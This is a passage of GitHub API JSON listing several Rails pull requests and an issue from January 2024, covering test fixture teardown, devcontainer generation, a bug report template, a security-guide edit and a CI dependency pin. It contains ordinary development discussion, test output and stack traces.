            "node_id": "MDQ6VXNlcjE2NTMwNTY0",
            "avatar_url": "https://avatars.githubusercontent.com/u/16530564?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ttstarck",
            "html_url": "https://github.com/ttstarck",
            "followers_url": "https://api.github.com/users/ttstarck/followers",
            "following_url": "https://api.github.com/users/ttstarck/following{/other_user}",
            "gists_url": "https://api.github.com/users/ttstarck/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ttstarck/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ttstarck/subscriptions",
            "organizations_url": "https://api.github.com/users/ttstarck/orgs",
            "repos_url": "https://api.github.com/users/ttstarck/repos",
            "events_url": "https://api.github.com/users/ttstarck/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ttstarck/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107188,
                "node_id": "MDU6TGFiZWwxMDcxODg=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailer",
                "name": "actionmailer",
                "color": "8B00FC",
                "default": false,
                "description": null
            },
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-01-30T04:04:00Z",
        "updated_at": "2024-01-31T00:28:26Z",
        "closed_at": "2024-01-31T00:05:18Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50915",
            "html_url": "https://github.com/rails/rails/pull/50915",
            "diff_url": "https://github.com/rails/rails/pull/50915.diff",
            "patch_url": "https://github.com/rails/rails/pull/50915.patch",
            "merged_at": "2024-01-31T00:05:18Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because `ActiveRecord::TestFixtures.teardown_fixtures` method does not get called if a `MiniTest::Assertion` error is raised in `ActiveSupport::TestCase.teardown` callbacks.\r\n\r\n### Test Case to Reproduce the Problem\r\n``` ruby\r\nclass DrinkTest < ActiveSupport::TestCase\r\n  teardown do\r\n    if @failure_test\r\n      flunk\r\n    end\r\n  end\r\n\r\n  test \"should fail\" do\r\n    @failure_test = true\r\n    Drink.create!(name: \"test\")\r\n  end\r\n\r\n  test \"should pass\" do\r\n    assert_equal 0, Drink.where(name: \"test\").size\r\n  end\r\nend\r\n```\r\nRunning the above test case with a seed that runs `should fail` and then `should pass`:\r\n```\r\nbundle exec ruby test/models/drink_test.rb\r\nRunning 2 tests in a single process (parallelization threshold is 50)\r\nRun options: --seed 6897\r\n\r\n# Running:\r\n\r\nF\r\n\r\nFailure:\r\nDrinkTest#test_should_fail [test/models/drink_test.rb:6]:\r\nEpic Fail!\r\n\r\n\r\nbin/rails test test/models/drink_test.rb:10\r\n\r\nF\r\n\r\nFailure:\r\nDrinkTest#test_should_pass [test/models/drink_test.rb:16]:\r\nExpected: 0\r\n  Actual: 1\r\n\r\n\r\nbin/rails test test/models/drink_test.rb:15\r\n\r\n\r\n\r\nFinished in 0.016991s, 117.7094 runs/s, 117.7094 assertions/s.\r\n2 runs, 2 assertions, 2 failures, 0 errors, 0 skips\r\n```\r\n\r\nRunning the test file with a seed with the following order: `should pass` -> `should fail`:\r\n\r\n```\r\nbundle exec ruby test/models/drink_test.rb\r\nRunning 2 tests in a single process (parallelization threshold is 50)\r\nRun options: --seed 3383\r\n\r\n# Running:\r\n\r\n.F\r\n\r\nFailure:\r\nDrinkTest#test_should_fail [test/models/drink_test.rb:6]:\r\nEpic Fail!\r\n\r\n\r\nbin/rails test test/models/drink_test.rb:10\r\n\r\n\r\n\r\nFinished in 0.016423s, 121.7804 runs/s, 121.7804 assertions/s.\r\n2 runs, 2 assertions, 1 failures, 0 errors, 0 skips\r\n```\r\n\r\n#### Specifications\r\nruby: 3.2.2\r\nrails: 7.1.1\r\nminitest: 5.21.0\r\nOS: MacOS arm64-darwin\r\nDatabase: SQLite\r\n\r\n### Detail\r\n\r\nThis Pull Request changes the following files:\r\n\r\n#### `ActiveSupport::Testing::SetupAndTeardown`\r\nRenames the following class methods in \r\n* `after_teardown` -> `teardown`\r\n* `before_setup` -> `setup`.\r\n\r\nWhy switch from `after_teardown` to `teardown` and `before_setup` to `setup`?\r\n\r\nWhen a user defines a `teardown` callback block in their test case, it will actually run in the `after_teardown` Minitest Lifecycle hook. This is confusing and has a major side effect that if a user defines an `assertion` in that teardown code, it will raise out without getting rescued (see the [calling code](https://github.com/rails/rails/blob/main/activesupport/lib/active_support/testing/setup_and_teardown.rb#L47)). This means `super` will never get called, `ActiveRecord::TestFixtures.teardown_fixtures` will never run, and the database state will not get rolled back.\r\n\r\nBy moving the `teardown` callbacks to run in the `teardown` lifecycle, all `after_teardown` code will run since the error will get rescued by Minitest's lifecycle management:\r\n* [Lifecycle hooks](https://github.com/minitest/minitest/blob/master/lib/minitest/test.rb#L98-L100)\r\n* [capture_exceptions](https://github.com/minitest/minitest/blob/master/lib/minitest/test.rb#L194)\r\n\r\nMinitest also provides recommendations about when to use `after_teardown` and `before_setup`:\r\nhttps://docs.seattlerb.org/minitest/Minitest/Test/LifecycleHooks.html\r\n\r\n> after_teardown()\r\n> Runs after every test, after teardown. This hook is meant for libraries to extend minitest. It is not meant to be used by test developers.\r\n\r\nThere is a slight grey area here, where the `setup` and `teardown` callbacks are code written and provided by the \"test developers\". It was surprising at least to me to find that they were not run in `setup` and `teardown` Minitest Lifecycle hooks but rather `before_setup` and `after_teardown`.\r\n\r\nMoving the callbacks to run in their respective Minitest Lifecycle hooks properly will follow Minitest's recommendations and clear up any confusion about where these callbacks are run.\r\n\r\n#### `ActiveRecord::TestFixture.after_teardown`\r\n* Wrap `teardown_fixtures` in `ensure` block to always run the code that rolls back the test's database transactions.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50915/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50915/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50914",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50914/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50914/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50914/events",
        "html_url": "https://github.com/rails/rails/pull/50914",
        "id": 2106594568,
        "node_id": "PR_kwDNIULOZWKOxQ",
        "number": 50914,
        "title": "Generate devcontainer files by default",
        "user": {
            "login": "andrewn617",
            "id": 39735028,
            "node_id": "MDQ6VXNlcjM5NzM1MDI4",
            "avatar_url": "https://avatars.githubusercontent.com/u/39735028?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/andrewn617",
            "html_url": "https://github.com/andrewn617",
            "followers_url": "https://api.github.com/users/andrewn617/followers",
            "following_url": "https://api.github.com/users/andrewn617/following{/other_user}",
            "gists_url": "https://api.github.com/users/andrewn617/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/andrewn617/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/andrewn617/subscriptions",
            "organizations_url": "https://api.github.com/users/andrewn617/orgs",
            "repos_url": "https://api.github.com/users/andrewn617/repos",
            "events_url": "https://api.github.com/users/andrewn617/events{/privacy}",
            "received_events_url": "https://api.github.com/users/andrewn617/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            },
            {
                "id": 1174770998,
                "node_id": "MDU6TGFiZWwxMTc0NzcwOTk4",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailbox",
                "name": "actionmailbox",
                "color": "f4a6cb",
                "default": false,
                "description": ""
            },
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-29T23:03:25Z",
        "updated_at": "2024-02-20T17:39:49Z",
        "closed_at": "2024-02-14T22:17:07Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50914",
            "html_url": "https://github.com/rails/rails/pull/50914",
            "diff_url": "https://github.com/rails/rails/pull/50914.diff",
            "patch_url": "https://github.com/rails/rails/pull/50914.patch",
            "merged_at": "2024-02-14T22:17:07Z"
        },
        "body": "https://github.com/rails/rails/issues/50566\r\n\r\n### Motivation / Background\r\n\r\nThis Pull Request has been created to generate `devcontainer` files for new Rails apps.\r\n\r\n### Detail\r\n\r\nThis Pull Request adds templates for devcontainer files (`devcontainer.json`, `Dockerfile` and `docker-compose.yml`) to be generated on `rails new`.\r\n\r\nBy default the devcontainer contains the following:\r\n- A redis container for use with Kredis, Action Cable etc.\r\n- A database (SQLite, Postgres, MySQL or MariaDB)\r\n- A Headless chrome container for system tests\r\n- Active Storage configured to use the local disk and with preview features working\r\n\r\nIf `rails new` is called with options to skip any of the above they will be removed from the dev container config.\r\n\r\nThe dev container can be skipped entirely with the `--skip_devcontainer` option.\r\n\r\n### Additional information\r\n\r\nA few changes are needed to other files generated by rails new to make sure new Rails apps can be developed both in a container and locally.\r\n\r\n- ~Differentiate `CABLE_REDIS_URL` and `JOBS_REDIS_URL` instead of just using `REDIS_URL` for both (A PR will need to be opened to turbo-rails to make this change as well)~\r\n- ~For MariaDB and MySQL use the `RAILS_DATABASE_HOST` if it's set (which it will be in a container) and fallback to `localhost`~\r\n- ~For Postgres set the host (`RAILS_DATABASE_HOST`), username and password when in a container`~\r\n\r\nBased on feedback received I reverted the above ^. Instead we will just `REDIS_URL` and `DB_HOST`.\r\n\r\nFor system tests, we need to configure the `Capybara` host and port to the selenium container. Rather than expose the implementation details of `Capybara` to the developer, we created a new `served_by` method on `SystemTestCase` to configure these.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50914/reactions",
            "total_count": 12,
            "+1": 7,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 5,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50914/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50913",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50913/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50913/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50913/events",
        "html_url": "https://github.com/rails/rails/pull/50913",
        "id": 2106318153,
        "node_id": "PR_kwDNIULOZV7HTg",
        "number": 50913,
        "title": "Add `activesupport` bug report template",
        "user": {
            "login": "seanpdoyle",
            "id": 2575027,
            "node_id": "MDQ6VXNlcjI1NzUwMjc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2575027?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/seanpdoyle",
            "html_url": "https://github.com/seanpdoyle",
            "followers_url": "https://api.github.com/users/seanpdoyle/followers",
            "following_url": "https://api.github.com/users/seanpdoyle/following{/other_user}",
            "gists_url": "https://api.github.com/users/seanpdoyle/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/seanpdoyle/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/seanpdoyle/subscriptions",
            "organizations_url": "https://api.github.com/users/seanpdoyle/orgs",
            "repos_url": "https://api.github.com/users/seanpdoyle/repos",
            "events_url": "https://api.github.com/users/seanpdoyle/events{/privacy}",
            "received_events_url": "https://api.github.com/users/seanpdoyle/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 8,
        "created_at": "2024-01-29T20:05:19Z",
        "updated_at": "2024-01-30T02:49:48Z",
        "closed_at": "2024-01-29T20:27:46Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50913",
            "html_url": "https://github.com/rails/rails/pull/50913",
            "diff_url": "https://github.com/rails/rails/pull/50913.diff",
            "patch_url": "https://github.com/rails/rails/pull/50913.patch",
            "merged_at": null
        },
        "body": "Introduce Active Support bug report templates for contributors to reproduce issues with a failing `Minitest::Test`.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50913/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50913/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50912",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50912/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50912/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50912/events",
        "html_url": "https://github.com/rails/rails/pull/50912",
        "id": 2105499855,
        "node_id": "PR_kwDNIULOZVN_xA",
        "number": 50912,
        "title": "Remove stolen data prices from the security guide",
        "user": {
            "login": "nvasilevski",
            "id": 5512772,
            "node_id": "MDQ6VXNlcjU1MTI3NzI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nvasilevski",
            "html_url": "https://github.com/nvasilevski",
            "followers_url": "https://api.github.com/users/nvasilevski/followers",
            "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
            "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
            "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
            "repos_url": "https://api.github.com/users/nvasilevski/repos",
            "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-29T13:26:08Z",
        "updated_at": "2024-01-29T15:01:07Z",
        "closed_at": "2024-01-29T15:01:06Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50912",
            "html_url": "https://github.com/rails/rails/pull/50912",
            "diff_url": "https://github.com/rails/rails/pull/50912.diff",
            "patch_url": "https://github.com/rails/rails/pull/50912.patch",
            "merged_at": "2024-01-29T15:01:06Z"
        },
        "body": "I don't think that assuming bad actor's intention and listing dark market prices (probably outdated) for stolen data helps people learn about securing their web applications. So I'm proposing we drop this section as irrelevant and as it creates a soft obligation of keeping this info up-to-date.\r\n\r\nIf there is a reason this section was added to the guide or you have a different opinion - feel free to speak up!\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50912/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50912/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50911",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50911/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50911/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50911/events",
        "html_url": "https://github.com/rails/rails/pull/50911",
        "id": 2105415617,
        "node_id": "PR_kwDNIULOZVJVgQ",
        "number": 50911,
        "title": "Use `httpclient` to run \"Daily build with Ruby head\"",
        "user": {
            "login": "yahonda",
            "id": 73684,
            "node_id": "MDQ6VXNlcjczNjg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/73684?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yahonda",
            "html_url": "https://github.com/yahonda",
            "followers_url": "https://api.github.com/users/yahonda/followers",
            "following_url": "https://api.github.com/users/yahonda/following{/other_user}",
            "gists_url": "https://api.github.com/users/yahonda/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yahonda/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yahonda/subscriptions",
            "organizations_url": "https://api.github.com/users/yahonda/orgs",
            "repos_url": "https://api.github.com/users/yahonda/repos",
            "events_url": "https://api.github.com/users/yahonda/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yahonda/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-29T12:42:23Z",
        "updated_at": "2024-01-30T00:43:53Z",
        "closed_at": "2024-01-29T17:32:06Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50911",
            "html_url": "https://github.com/rails/rails/pull/50911",
            "diff_url": "https://github.com/rails/rails/pull/50911.diff",
            "patch_url": "https://github.com/rails/rails/pull/50911.patch",
            "merged_at": "2024-01-29T17:32:06Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis pull request addresses \"Daily build with Ruby head\" failure https://buildkite.com/rails/rails-nightly/builds/101#018d5285-b4de-4072-b7d3-61c19f21347a\r\n\r\n### Detail\r\n\r\nAction Mailbox needs `webmock` which depends on `httpclient`. `httpclient` master branch that added `mutex_m` as a dependency via https://github.com/nahi/httpclient/pull/455 to support Ruby 3.4.0dev.\r\n\r\n#### Steps to reproduce\r\n```ruby\r\ncd actionmailbox\r\nbundle exec rake test\r\n```\r\n\r\n#### Without this commit\r\n```ruby\r\n... snip ...\r\n/home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/gems/3.4.0+0/gems/webmock-3.19.1/lib/webmock/http_lib_adapters/httpclient_adapter.rb:234:in `alias_method': undefined method `do_get_block' for class `WebMockHTTPClient' (NameError)\r\n\r\n    alias_method :do_get_block_without_webmock, :do_get_block\r\n    ^^^^^^^^^^^^\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/gems/3.4.0+0/gems/webmock-3.19.1/lib/webmock/http_lib_adapters/httpclient_adapter.rb:234:in `<class:WebMockHTTPClient>'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/gems/3.4.0+0/gems/webmock-3.19.1/lib/webmock/http_lib_adapters/httpclient_adapter.rb:233:in `<top (required)>'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/gems/3.4.0+0/gems/webmock-3.19.1/lib/webmock.rb:52:in `require_relative'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/gems/3.4.0+0/gems/webmock-3.19.1/lib/webmock.rb:52:in `<top (required)>'\r\n        from <internal:/home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/3.4.0+0/rubygems/core_ext/kernel_require.rb>:37:in `require'\r\n        from <internal:/home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/3.4.0+0/rubygems/core_ext/kernel_require.rb>:37:in `require'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/3.4.0+0/bundled_gems.rb:74:in `block (2 levels) in replace_require'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/gems/3.4.0+0/gems/zeitwerk-2.6.12/lib/zeitwerk/kernel.rb:38:in `require'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/3.4.0+0/bundler/runtime.rb:60:in `block (2 levels) in require'\r\n        from <internal:array>:52:in `each'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/3.4.0+0/bundler/runtime.rb:55:in `block in require'\r\n        from <internal:array>:52:in `each'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/3.4.0+0/bundler/runtime.rb:44:in `require'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/3.4.0+0/bundler.rb:187:in `require'\r\n        from /home/yahonda/src/github.com/rails/rails/actionmailbox/test/dummy/config/application.rb:7:in `<top (required)>'\r\n        from /home/yahonda/src/github.com/rails/rails/actionmailbox/test/dummy/config/environment.rb:2:in `require_relative'\r\n        from /home/yahonda/src/github.com/rails/rails/actionmailbox/test/dummy/config/environment.rb:2:in `<top (required)>'\r\n        from /home/yahonda/src/github.com/rails/rails/actionmailbox/test/test_helper.rb:8:in `require_relative'\r\n        from /home/yahonda/src/github.com/rails/rails/actionmailbox/test/test_helper.rb:8:in `<top (required)>'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/3.4.0+0/bundled_gems.rb:74:in `require'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/3.4.0+0/bundled_gems.rb:74:in `block (2 levels) in replace_require'\r\n        from /home/yahonda/src/github.com/rails/rails/actionmailbox/test/controllers/ingresses/mailgun/inbound_emails_controller_test.rb:3:in `<top (required)>'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/3.4.0+0/bundled_gems.rb:74:in `require'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/3.4.0+0/bundled_gems.rb:74:in `block (2 levels) in replace_require'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/gems/3.4.0+0/gems/rake-13.1.0/lib/rake/rake_test_loader.rb:21:in `block in <main>'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/gems/3.4.0+0/gems/rake-13.1.0/lib/rake/rake_test_loader.rb:6:in `select'\r\n        from /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/gems/3.4.0+0/gems/rake-13.1.0/lib/rake/rake_test_loader.rb:6:in `<main>'\r\nrake aborted!\r\nCommand failed with status (1): [ruby -w -I\"lib:test\" /home/yahonda/.rbenv/versions/ruby-dev/lib/ruby/gems/3.4.0+0/gems/rake-13.1.0/lib/rake/rake_test_loader.rb \"test/controllers/ingresses/mailgun/inbound_emails_controller_test.rb\" \"test/controllers/ingresses/mandrill/inbound_emails_controller_test.rb\" \"test/controllers/ingresses/postmark/inbound_emails_controller_test.rb\" \"test/controllers/ingresses/relay/inbound_emails_controller_test.rb\" \"test/controllers/ingresses/sendgrid/inbound_emails_controller_test.rb\" \"test/controllers/rails/action_mailbox/inbound_emails_controller_test.rb\" \"test/generators/mailbox_generator_test.rb\" \"test/jobs/incineration_job_test.rb\" \"test/migrations_test.rb\" \"test/models/table_name_test.rb\" \"test/unit/inbound_email/incineration_test.rb\" \"test/unit/inbound_email/message_id_test.rb\" \"test/unit/inbound_email_test.rb\" \"test/unit/mail_ext/address_equality_test.rb\" \"test/unit/mail_ext/address_wrapping_test.rb\" \"test/unit/mail_ext/addresses_test.rb\" \"test/unit/mailbox/bouncing_test.rb\" \"test/unit/mailbox/callbacks_test.rb\" \"test/unit/mailbox/notifications_test.rb\" \"test/unit/mailbox/routing_test.rb\" \"test/unit/mailbox/state_test.rb\" \"test/unit/relayer_test.rb\" \"test/unit/router_test.rb\" \"test/unit/test_helper_test.rb\" ]\r\n<internal:array>:52:in `each'\r\n<internal:array>:52:in `each'\r\n/home/yahonda/.rbenv/versions/ruby-dev/bin/bundle:25:in `load'\r\n/home/yahonda/.rbenv/versions/ruby-dev/bin/bundle:25:in `<main>'\r\nTasks: TOP => test\r\n(See full trace by running task with --trace)\r\n$\r\n```\r\n\r\n### Additional information\r\n\r\n`httpclient` gem that includes  https://github.com/nahi/httpclient/pull/455  has not been released to rubygems.org yet. In the meantime I want to make \"Daily build with Ruby head\" green. Once the newer versions of http client is released this commit can be reverted.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50911/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50911/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50910",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50910/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50910/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50910/events",
        "html_url": "https://github.com/rails/rails/issues/50910",
        "id": 2104763755,
        "node_id": "I_kwDNIULOfXQlaw",
        "number": 50910,
        "title": "Command rails server fails if all db configs have database_tasks: false",
        "user": {
            "login": "pjartarkar-mdsol",
            "id": 100128718,
            "node_id": "U_kgDOBffXzg",
            "avatar_url": "https://avatars.githubusercontent.com/u/100128718?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/pjartarkar-mdsol",
